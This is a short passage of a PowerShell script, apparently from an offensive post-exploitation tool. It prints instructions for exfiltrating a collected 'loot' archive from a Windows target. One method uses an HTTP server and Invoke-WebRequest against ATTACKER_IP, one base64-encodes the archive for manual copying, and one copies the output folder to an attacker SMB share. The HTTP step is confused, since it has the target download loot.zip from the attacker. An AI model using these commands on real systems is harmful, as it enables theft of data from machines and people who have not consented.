Write-Host "  PowerShell HTTP download (from attacker):" -ForegroundColor Blue
Write-Host "  Attacker: python3 -m http.server 8080  (in dir containing loot.zip)"
Write-Host "  Target:   Invoke-WebRequest http://ATTACKER_IP:8080/loot.zip -OutFile C:\loot.zip"
Write-Host ""
Write-Host "  Base64 exfil (no outbound file transfer):" -ForegroundColor Blue
Write-Host "  `$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('`$env:TEMP\loot.zip'))"
Write-Host "  `$b64 | Out-File `$env:TEMP\loot.b64"
Write-Host "  # Copy loot.b64 contents, decode on attacker with: base64 -d loot.b64 > loot.zip"
Write-Host ""
Write-Host "  SMB (if you have a share):" -ForegroundColor Blue
Write-Host "  copy $OutputDir \\ATTACKER_IP\share\loot /E"
Write-Host ""
